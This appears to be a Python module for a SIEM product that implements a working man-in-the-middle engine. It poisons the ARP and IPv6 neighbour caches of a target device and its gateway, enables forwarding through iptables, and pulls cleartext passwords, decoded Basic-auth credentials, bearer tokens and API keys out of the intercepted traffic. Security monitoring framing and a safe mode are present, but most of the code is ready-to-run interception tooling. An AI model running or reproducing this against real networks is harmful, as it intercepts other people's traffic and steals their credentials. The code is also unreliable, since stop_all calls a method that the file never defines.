"""
CyberRemedy SIEM — Production-Grade MITM Engine v1.2
======================================================
Enterprise-grade Man-in-the-Middle with:
  - ARP (IPv4) + NDP (IPv6) poisoning
  - Deep Packet Inspection: HTTP, DNS, TLS SNI, credentials
  - Structured SIEM events (risk scored, MITRE tagged)
  - Safe mode (sniff-only, no spoofing)
  - 4-method MAC resolution for Android/iPhone
  - MITMConfig dataclass - all params configurable
  - Event callbacks for SOAR integration
  - Bounded memory (deque), rate limiting, type hints
"""
import base64, hashlib, ipaddress, logging, math, os, re, socket
import struct, subprocess, threading, time
from collections import defaultdict, deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("cyberremedy.siem.mitm")


# ── Config ─────────────────────────────────────────────────────────────────────

@dataclass
class MITMConfig:
    poison_interval:     float = 2.0
    arp_timeout:         int   = 3
    arp_retries:         int   = 3
    arp_rate_limit:      float = 0.5
    max_packets:         int   = 5000
    max_events:          int   = 1000
    safe_mode:           bool  = False
    allowed_targets:     List[str] = field(default_factory=list)
    blocked_targets:     List[str] = field(default_factory=list)
    enable_dpi:          bool  = True
    enable_cred_detect:  bool  = True
    enable_dns_detect:   bool  = True
    dns_tunnel_thresh:   float = 3.5
    dns_long_thresh:     int   = 50
    cred_risk_score:     int   = 90
    dns_tunnel_score:    int   = 75
    anomaly_pps_thresh:  float = 50.0
    shutdown_timeout:    float = 5.0


# ── Structured event factory ────────────────────────────────────────────────────

def _sev(score: int) -> str:
    if score >= 90: return "CRITICAL"
    if score >= 70: return "HIGH"
    if score >= 40: return "MEDIUM"
    return "LOW"

_MITRE = {
    "credential_leak":   "T1040",
    "dns_tunnel":        "T1048.003",
    "http_cleartext":    "T1040",
    "anomaly_high_rate": "T1498",
    "tls_sni":           "T1071.001",
    "suspicious_dns":    "T1071.004",
    "data_transfer":     "T1041",
    "mitm_packet":       "T1557.002",
}

def _make_event(event_type, src_ip, dst_ip, protocol, risk_score,
                details=None, session_id=""):
    return {
        "event":       "mitm_intercepted",
        "event_type":  event_type,
        "session_id":  session_id,
        "src_ip":      src_ip,
        "dst_ip":      dst_ip,
        "protocol":    protocol,
        "risk_score":  min(100, max(0, risk_score)),
        "severity":    _sev(risk_score),
        "timestamp":   datetime.now(timezone.utc).isoformat(),
        "details":     details or {},
        "mitre_id":    _MITRE.get(event_type, "T1040"),
    }


# ── Deep Packet Inspector ───────────────────────────────────────────────────────

class PacketInspector:
    CRED_RE = [
        rb"(?:password|passwd|pwd|pass)[\s=:&]+([^\s&\r\n]{1,64})",
        rb"(?:Authorization:\s*Basic\s+)([A-Za-z0-9+/=]{4,})",
        rb"(?:Authorization:\s*Bearer\s+)([A-Za-z0-9._\-+/=]{10,})",
        rb"(?:api[-_]?key[\s=:\"']+)([A-Za-z0-9_\-]{16,})",
        rb"(?:token[\s=:\"']+)([A-Za-z0-9_\-\.]{16,})",
    ]

    def __init__(self, cfg: MITMConfig):
        self.cfg = cfg
        self._cred = [re.compile(p, re.I) for p in self.CRED_RE]

    def inspect(self, pkt: dict) -> List[dict]:
        events = []
        payload  = pkt.get("_raw_payload", b"") or b""
        proto    = pkt.get("protocol", "").upper()
        src_ip   = pkt.get("src_ip", "?")
        dst_ip   = pkt.get("dst_ip", "?")
        dst_port = int(pkt.get("dst_port", 0) or 0)
        src_port = int(pkt.get("src_port", 0) or 0)
        sid      = pkt.get("session_id", "")
        if not payload:
            return events
        # HTTP
        if dst_port in (80,8080,8000,8888) or src_port in (80,8080,8000,8888):
            events.extend(self._http(payload, src_ip, dst_ip, sid))
        # DNS
        if proto == "DNS" or dst_port == 53 or src_port == 53:
            events.extend(self._dns(payload, src_ip, dst_ip, pkt, sid))
        # TLS SNI
        if dst_port in (443, 8443, 465, 993, 995):
            sni = self._sni(payload)
            if sni:
                events.append(_make_event("tls_sni", src_ip, dst_ip, "TLS", 10,
                                          {"sni": sni, "dst_port": dst_port}, sid))
        # Credentials in any plaintext
        if self.cfg.enable_cred_detect and len(payload) > 10:
            events.extend(self._creds(payload, src_ip, dst_ip, proto, sid))
        return events

    def _http(self, payload, src_ip, dst_ip, sid):
        events = []
        try:
            text  = payload.decode("utf-8", errors="replace")
            lines = text.split("\r\n")
            m = re.match(r"(GET|POST|PUT|DELETE|PATCH|HEAD)\s+(\S+)\s+HTTP", lines[0])
            if not m: return events
            method, path = m.group(1), m.group(2)
            host = next((l.split(":",1)[1].strip() for l in lines[1:20]
                         if l.lower().startswith("host:")), "")
            ctype = next((l.split(":",1)[1].strip() for l in lines[1:20]
                          if l.lower().startswith("content-type:")), "")
            risk = 15
            details = {"method":method,"path":path[:200],"host":host}
            if method == "POST" and "form" in ctype.lower():
                risk = 60; details["note"] = "POST form-data"
            if re.search(r"[?&](password|passwd|token|key|secret)=", path, re.I):
                risk = 85; details["note"] = "Credentials in URL"
            events.append(_make_event("http_cleartext", src_ip, dst_ip, "HTTP",
                                      risk, details, sid))
        except Exception:
            pass
        return events

    def _dns(self, payload, src_ip, dst_ip, pkt, sid):
        events = []
        if not self.cfg.enable_dns_detect: return events
        query = pkt.get("dns_query","") or self._parse_dns(payload)
        if not query: return events
        parts = query.rstrip(".").split(".")
        if len(parts) < 2: return events
        sub = ".".join(parts[:-2]) if len(parts) > 2 else ""
        details = {"query":query,"subdomain":sub or "(none)"}
        if sub and len(sub) > self.cfg.dns_long_thresh:
            events.append(_make_event("suspicious_dns", src_ip, dst_ip, "DNS", 55,
                                      {**details,"reason":"long_subdomain"}, sid))
        if sub and len(sub) > 20:
            ent = self._entropy(sub.replace(".",""))
            if ent > self.cfg.dns_tunnel_thresh:
                events.append(_make_event("dns_tunnel", src_ip, dst_ip, "DNS",
                                          self.cfg.dns_tunnel_score,
                                          {**details,"entropy":round(ent,3),"reason":"high_entropy"}, sid))
        if len(parts) > 6:
            events.append(_make_event("dns_tunnel", src_ip, dst_ip, "DNS",
                                      self.cfg.dns_tunnel_score-10,
                                      {**details,"reason":"many_labels","count":len(parts)}, sid))
        return events

    def _creds(self, payload, src_ip, dst_ip, proto, sid):
        for pat in self._cred:
            m = pat.search(payload)
            if m:
                raw = m.group(1)
                disp = raw[:40].decode("utf-8","replace") if isinstance(raw,bytes) else str(raw)[:40]
                try:
                    if b"Basic" in payload[:200]:
                        disp = base64.b64decode(raw+b"==").decode("utf-8","replace")[:60]
                except Exception:
                    pass
                return [_make_event("credential_leak", src_ip, dst_ip, proto,
                                    self.cfg.cred_risk_score,
                                    {"sample":disp,"warning":"CLEARTEXT CREDENTIAL"}, sid)]
        return []

    @staticmethod
    def _sni(payload):
        try:
            if len(payload) < 5 or payload[0] != 0x16: return None
            if payload[5] != 0x01: return None
            idx = payload.find(b"\x00\x00", 40)
            while idx != -1:
                if idx+9 < len(payload):
                    n = struct.unpack("!H", payload[idx+7:idx+9])[0]
                    if idx+9+n <= len(payload):
                        s = payload[idx+9:idx+9+n].decode("ascii","replace")
                        if "." in s and len(s) < 256: return s
                idx = payload.find(b"\x00\x00", idx+1)
        except Exception:
            pass
        return None

    @staticmethod
    def _parse_dns(payload):
        try:
            for offset in [0, 42, 28]:
                try:
                    data = payload[offset:]
                    if len(data) < 13: continue
                    pos, parts = 12, []
                    while pos < len(data) and data[pos] != 0:
                        n = data[pos]; pos += 1
                        if pos+n > len(data): break
                        parts.append(data[pos:pos+n].decode("ascii","replace"))
                        pos += n
                    if parts: return ".".join(parts)
                except Exception:
                    continue
        except Exception:
            pass
        return ""

    @staticmethod
    def _entropy(s):
        if not s: return 0.0
        freq = defaultdict(int)
        for c in s: freq[c] += 1
        n = len(s)
        return -sum((f/n)*math.log2(f/n) for f in freq.values() if f > 0)


# ── Rate limiter ────────────────────────────────────────────────────────────────

class _RateLimiter:
    def __init__(self, min_interval):
        self._min = min_interval; self._last = 0.0; self._lock = threading.Lock()
    def ok(self):
        with self._lock:
            now = time.time()
            if now - self._last >= self._min:
                self._last = now; return True
            return False


# ── MITM Session ────────────────────────────────────────────────────────────────

class MITMSession:
    """
    Production-grade ARP/NDP MITM session with DPI and structured events.

    Args:
        target_ip:      IP address of target device
        gateway_ip:     IP address of router/gateway
        iface:          Network interface (e.g. "wlan0")
        pkt_callback:   Called with every intercepted packet dict
        alert_callback: Called with structured event dicts from DPI
        config:         MITMConfig instance (optional)
        known_mac:      Pre-known target MAC (bypasses ARP resolution)
    """

    def __init__(self, target_ip, gateway_ip, iface,
                 pkt_callback=None, alert_callback=None,
                 config=None, known_mac="", **kwargs):
        self.target_ip    = target_ip
        self.gateway_ip   = gateway_ip
        self.iface        = iface
        self._pkt_cb      = pkt_callback
        self._alert_cb    = alert_callback
        self.cfg          = config or MITMConfig()
        self._known_mac   = (known_mac or kwargs.get("known_mac","")).lower()
        self._running     = False
        self._thread      = None
        self._my_mac      = ""
        self._target_mac  = ""
        self._gateway_mac = ""
        self._session_id  = hashlib.md5(
            f"{target_ip}{gateway_ip}{time.time()}".encode()).hexdigest()[:12]
        self._intercepted = deque(maxlen=self.cfg.max_packets)
        self._events      = deque(maxlen=self.cfg.max_events)
        self._stats: Dict[str,Any] = {
            "total":0,"TCP":0,"UDP":0,"DNS":0,"ICMP":0,
            "OTHER":0,"alerts":0,"start_time":None,
        }
        self._dpi         = PacketInspector(self.cfg)
        self._arp_lim     = _RateLimiter(self.cfg.arp_rate_limit)
        self._pkt_times   = deque(maxlen=200)
        self._validate()

    def _validate(self):
        for name, ip in [("target_ip",self.target_ip),("gateway_ip",self.gateway_ip)]:
            try: ipaddress.ip_address(ip)
            except ValueError: raise ValueError(f"Invalid {name}: {ip!r}")
        if self.target_ip == self.gateway_ip:
            raise ValueError("target_ip must differ from gateway_ip")
        if self.cfg.allowed_targets and self.target_ip not in self.cfg.allowed_targets:
            raise ValueError(f"{self.target_ip} not in allowed_targets whitelist")
        if self.target_ip in self.cfg.blocked_targets:
            raise ValueError(f"{self.target_ip} is in blocked_targets list")

    # ── Public interface ──────────────────────────────────────────────────────

    def start(self):
        """Resolve MACs, enable forwarding, start poison loop."""
        if self._running: return
        if os.geteuid() != 0:
            raise PermissionError("MITM requires root")
        try:
            from scapy.arch import get_if_hwaddr
        except ImportError:
            raise ImportError("pip install scapy")
        self._my_mac      = get_if_hwaddr(self.iface)
        self._target_mac  = self._resolve_mac(self.target_ip)
        self._gateway_mac = self._resolve_mac(self.gateway_ip)
        if not self._target_mac:
            if self._known_mac:
                self._target_mac = self._known_mac
                logger.info(f"[MITM] Using known MAC for {self.target_ip}: {self._target_mac}")
            else:
                raise RuntimeError(
                    f"Cannot resolve MAC for {self.target_ip} — "
                    f"device offline or MAC randomization active. "
                    f"Pass known_mac= or wait for device to send traffic.")
        if not self._gateway_mac:
            raise RuntimeError(f"Cannot resolve MAC for gateway {self.gateway_ip}")
        if not self.cfg.safe_mode:
            self._fwd(True)
        self._running = True
        self._stats["start_time"] = time.time()
        is_v6 = ipaddress.ip_address(self.target_ip).version == 6
        if is_v6:
            target = self._ndp_loop
        elif self.cfg.safe_mode:
            target = self._safe_loop
        else:
            target = self._arp_loop
        self._thread = threading.Thread(target=target, daemon=True,
                                        name=f"mitm-{self._session_id}")
        self._thread.start()
        logger.info(
            f"[MITM] Session {self._session_id}: {self.target_ip} "
            f"(MAC {self._target_mac}) ← gw {self.gateway_ip} "
            f"[{'NDP/IPv6' if is_v6 else 'safe' if self.cfg.safe_mode else 'ARP/IPv4'}]")

    def stop(self):
        """Graceful shutdown — restore ARP tables."""
        if not self._running: return
        logger.info(f"[MITM] Stopping {self._session_id} for {self.target_ip}")
        self._running = False
        if self._thread:
            self._thread.join(timeout=self.cfg.shutdown_timeout)
        if not self.cfg.safe_mode:
            self._restore_arp()
            self._fwd(False)
        logger.info(f"[MITM] ARP restored for {self.target_ip}")

    def record_packet(self, pkt: dict):
        """
        Feed a sniffer packet into this session.
        Matches by IP OR MAC (handles ARP-poisoned traffic where
        forwarded packets may still show gateway IP).
        """
        if not self._running: return
        src_ip  = pkt.get("src_ip","")
        dst_ip  = pkt.get("dst_ip","")
        src_mac = (pkt.get("src_mac") or "").lower()
        dst_mac = (pkt.get("dst_mac") or "").lower()
        tmac    = self._target_mac.lower() if self._target_mac else ""
        ip_hit  = src_ip == self.target_ip or dst_ip == self.target_ip
        mac_hit = tmac and (src_mac == tmac or dst_mac == tmac)
        if not ip_hit and not mac_hit: return
        entry = {**pkt, "mitm_intercepted":True, "session_id":self._session_id,
                 "captured_at": pkt.get("captured_at") or pkt.get("timestamp")
                                 or datetime.now(timezone.utc).isoformat()}
        self._intercepted.append(entry)
        proto = pkt.get("protocol","OTHER").upper()
        self._stats["total"] += 1
        self._stats[proto] = self._stats.get(proto,0) + 1
        self._pkt_times.append(time.time())
        if self._pkt_cb:
            try: self._pkt_cb(entry)
            except Exception as e: logger.debug(f"[MITM] pkt_cb: {e}")
        if self.cfg.enable_dpi and self._alert_cb:
            self._run_dpi(entry)
        self._rate_check(src_ip, dst_ip)

    def _run_dpi(self, pkt):
        try:
            for evt in self._dpi.inspect(pkt):
                self._stats["alerts"] += 1
                self._events.append(evt)
                try: self._alert_cb(evt)
                except Exception as e: logger.debug(f"[MITM] alert_cb: {e}")
        except Exception as e:
            logger.debug(f"[MITM] DPI: {e}")

    def _rate_check(self, src_ip, dst_ip):
        now   = time.time()
        pps   = sum(1 for t in self._pkt_times if now-t <= 1.0)
        if pps > self.cfg.anomaly_pps_thresh and self._alert_cb:
            evt = _make_event("anomaly_high_rate", src_ip, dst_ip, "ANY",
                              min(95, 40+int(pps/2)),
                              {"pps":pps,"threshold":self.cfg.anomaly_pps_thresh},
                              self._session_id)
            self._events.append(evt)
            try: self._alert_cb(evt)
            except Exception: pass

    # ── Poison loops ──────────────────────────────────────────────────────────

    def _arp_loop(self):
        try:
            from scapy.layers.l2 import ARP, Ether
            from scapy.sendrecv import sendp
        except ImportError: return
        while self._running:
            if self._arp_lim.ok():
                try:
                    sendp(Ether(dst=self._target_mac)/ARP(op=2,
                          pdst=self.target_ip, hwdst=self._target_mac,
                          psrc=self.gateway_ip, hwsrc=self._my_mac),
                          iface=self.iface, verbose=False)
                    sendp(Ether(dst=self._gateway_mac)/ARP(op=2,
                          pdst=self.gateway_ip, hwdst=self._gateway_mac,
                          psrc=self.target_ip, hwsrc=self._my_mac),
                          iface=self.iface, verbose=False)
                except Exception as e: logger.debug(f"[MITM] ARP send: {e}")
            time.sleep(self.cfg.poison_interval)

    def _ndp_loop(self):
        try:
            from scapy.layers.inet6 import IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr
            from scapy.layers.l2 import Ether
            from scapy.sendrecv import sendp
        except ImportError: return
        while self._running:
            if self._arp_lim.ok():
                try:
                    sendp(Ether(dst=self._target_mac)/IPv6(src=self.gateway_ip,dst=self.target_ip)/
                          ICMPv6ND_NA(tgt=self.gateway_ip,R=0,S=1,O=1)/
                          ICMPv6NDOptDstLLAddr(lladdr=self._my_mac),
                          iface=self.iface, verbose=False)
                    sendp(Ether(dst=self._gateway_mac)/IPv6(src=self.target_ip,dst=self.gateway_ip)/
                          ICMPv6ND_NA(tgt=self.target_ip,R=0,S=1,O=1)/
                          ICMPv6NDOptDstLLAddr(lladdr=self._my_mac),
                          iface=self.iface, verbose=False)
                except Exception as e: logger.debug(f"[MITM] NDP send: {e}")
            time.sleep(self.cfg.poison_interval)

    def _safe_loop(self):
        logger.info(f"[MITM] Safe-mode sniff for {self.target_ip} (no spoofing)")
        while self._running:
            time.sleep(1.0)

    # ── MAC resolution (4-method fallback for mobile devices) ─────────────────

    def _resolve_mac(self, ip: str) -> str:
        mac = self._mac_proc(ip)
        if mac: return mac
        mac = self._mac_arp_cmd(ip)
        if mac: return mac
        try:
            subprocess.run(["ping","-c","2","-W","1",ip],
                          capture_output=True, timeout=5)
        except Exception:
            pass
        mac = self._mac_arpreq(ip)
        if mac: return mac
        return self._mac_registry(ip)

    def _mac_proc(self, ip):
        try:
            for line in open("/proc/net/arp").read().splitlines():
                p = line.split()
                if len(p) >= 4 and p[0] == ip:
                    m = p[3].lower()
                    if m not in ("00:00:00:00:00:00","0x0"): return m
        except Exception: pass
        return ""

    def _mac_arp_cmd(self, ip):
        try:
            out = subprocess.check_output(["arp","-n",ip], text=True,
                                          timeout=3, stderr=subprocess.DEVNULL)
            m = re.search(r"([0-9a-f]{2}(?::[0-9a-f]{2}){5})", out, re.I)
            if m and m.group(1).lower() != "00:00:00:00:00:00":
                return m.group(1).lower()
        except Exception: pass
        return ""

    def _mac_arpreq(self, ip):
        try:
            from scapy.layers.l2 import ARP, Ether
            from scapy.sendrecv import srp
        except ImportError: return ""
        for attempt in range(self.cfg.arp_retries):
            try:
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip),
                             iface=self.iface,
                             timeout=self.cfg.arp_timeout + attempt*2,
                             verbose=False, retry=2)
                if ans: return ans[0][1].hwsrc.lower()
            except Exception as e:
                logger.debug(f"[MITM] ARP req {attempt+1} for {ip}: {e}")
        return ""

    def _mac_registry(self, ip):
        try:
            from siem.device_registry import DeviceRegistry
            d = DeviceRegistry().get_device_by_ip(ip)
            if d and d.get("mac"): return d["mac"].lower()
        except Exception: pass
        return ""

    # ── ARP restore ───────────────────────────────────────────────────────────

    def _restore_arp(self):
        if ipaddress.ip_address(self.target_ip).version == 6: return
        try:
            from scapy.layers.l2 import ARP, Ether
            from scapy.sendrecv import sendp
            for _ in range(3):
                sendp(Ether(dst=self._target_mac)/ARP(op=2,
                      pdst=self.target_ip, hwdst=self._target_mac,
                      psrc=self.gateway_ip, hwsrc=self._gateway_mac),
                      iface=self.iface, verbose=False, count=2)
                sendp(Ether(dst=self._gateway_mac)/ARP(op=2,
                      pdst=self.gateway_ip, hwdst=self._gateway_mac,
                      psrc=self.target_ip, hwsrc=self._target_mac),
                      iface=self.iface, verbose=False, count=2)
        except Exception as e:
            logger.debug(f"[MITM] Restore: {e}")

    def _fwd(self, enable: bool):
        val = "1\n" if enable else "0\n"
        for p in ["/proc/sys/net/ipv4/ip_forward",
                  "/proc/sys/net/ipv6/conf/all/forwarding"]:
            try: open(p, "w").write(val)
            except Exception: pass
        # Ensure iptables FORWARD chain accepts traffic on our interface.
        # Many distros default FORWARD to DROP — this silently kills internet
        # even when ip_forward=1. This is the #1 cause of "MITM kills internet".
        action = "-I" if enable else "-D"
        for cmd in [
            ["iptables",  action, "FORWARD", "-i", self.iface, "-j", "ACCEPT"],
            ["iptables",  action, "FORWARD", "-o", self.iface, "-j", "ACCEPT"],
            ["ip6tables", action, "FORWARD", "-i", self.iface, "-j", "ACCEPT"],
            ["ip6tables", action, "FORWARD", "-o", self.iface, "-j", "ACCEPT"],
        ]:
            try: subprocess.run(cmd, capture_output=True, timeout=3)
            except Exception: pass
        logger.info(f"[MITM] IP forwarding + FORWARD chain {'enabled' if enable else 'disabled'}")

    # ── Properties & accessors ────────────────────────────────────────────────

    @property
    def is_running(self): return self._running

    @property
    def session_id(self): return self._session_id

    @property
    def stats(self):
        elapsed = time.time() - (self._stats["start_time"] or time.time())
        now = time.time()
        return {**self._stats, "session_id":self._session_id,
                "target_ip":self.target_ip, "target_mac":self._target_mac,
                "gateway_ip":self.gateway_ip, "iface":self.iface,
                "safe_mode":self.cfg.safe_mode, "elapsed_s":round(elapsed,1),
                "pps":sum(1 for t in self._pkt_times if now-t<=1.0)}

    def mitm_packets(self, limit=100): return list(self._intercepted)[-limit:]
    def get_packets(self, limit=100):  return list(self._intercepted)[-limit:]
    def get_events(self, limit=100):   return list(self._events)[-limit:]

    def to_dict(self):
        return {"session_id":self._session_id,"target_ip":self.target_ip,
                "target_mac":self._target_mac,"gateway_ip":self.gateway_ip,
                "iface":self.iface,"running":self._running,
                "safe_mode":self.cfg.safe_mode,"stats":self.stats,
                "packet_count":self._stats["total"],
                "alert_count":self._stats["alerts"]}


# ── Backward-compatible MITMEngine (wraps MITMSession) ────────────────────────
# siem/manager.py imports MITMEngine — this wrapper preserves that interface
# while using the new production-grade MITMSession underneath.

class MITMEngine:
    """
    Multi-session MITM manager used by SIEMManager.
    Manages one MITMSession per target device simultaneously.
    """

    def __init__(self, iface: str = "wlan0", gateway_ip: str = "",
                 packet_callback=None, alert_callback=None, **kwargs):
        self._iface    = iface
        self._gw       = gateway_ip
        self._pkt_cb   = packet_callback
        self._alert_cb = alert_callback
        self._sessions: Dict[str, MITMSession] = {}
        self._lock     = threading.Lock()

    def set_gateway(self, gateway_ip: str) -> None:
        self._gw = gateway_ip
        with self._lock:
            for s in self._sessions.values():
                s.gateway_ip = gateway_ip

    def start_session(self, target_ip: str, known_mac: str = "") -> dict:
        if not self._gw:
            return {"ok": False, "error": "Gateway IP not set — cannot start MITM"}
        with self._lock:
            if target_ip in self._sessions and self._sessions[target_ip].is_running:
                return {"ok": False, "error": f"MITM already active for {target_ip}"}
            session = MITMSession(
                target_ip      = target_ip,
                gateway_ip     = self._gw,
                iface          = self._iface,
                pkt_callback   = self._pkt_cb,
                alert_callback = self._alert_cb,
                known_mac      = known_mac,
            )
            try:
                session.start()
                self._sessions[target_ip] = session
                logger.info(f"[MITM] Session started for {target_ip}")
                return {"ok": True, "target": target_ip, "gateway": self._gw}
            except Exception as exc:
                logger.error(f"[MITM] Start failed for {target_ip}: {exc}")
                return {"ok": False, "error": str(exc)}

    def stop_session(self, target_ip: str) -> dict:
        with self._lock:
            session = self._sessions.get(target_ip)
            if not session:
                return {"ok": False, "error": f"No active MITM session for {target_ip}"}
            session.stop()
            del self._sessions[target_ip]
            return {"ok": True, "stopped": target_ip}

    def stop_all(self) -> None:
        with self._lock:
            for session in list(self._sessions.values()):
                try: session.stop()
                except Exception: pass
            self._sessions.clear()
        MITMSession._disable_ip_forwarding()

    def feed_packet(self, pkt: dict) -> None:
        """Route incoming sniffer packet to the correct session by IP or MAC."""
        src = pkt.get("src_ip", "")
        dst = pkt.get("dst_ip", "")
        with self._lock:
            for session in self._sessions.values():
                if src == session.target_ip or dst == session.target_ip:
                    session.record_packet(pkt)

    def get_session_status(self, target_ip: str) -> dict:
        session = self._sessions.get(target_ip)
        if not session:
            return {"running": False, "target_ip": target_ip}
        return {**session.stats, "running": session.is_running}

    def get_intercepted(self, target_ip: str, limit: int = 100) -> list:
        session = self._sessions.get(target_ip)
        return session.get_packets(limit) if session else []

    def all_sessions(self) -> list:
        return [{"target_ip": ip, "running": s.is_running, **s.stats}
                for ip, s in self._sessions.items()]

    @property
    def active_count(self) -> int:
        return sum(1 for s in self._sessions.values() if s.is_running)
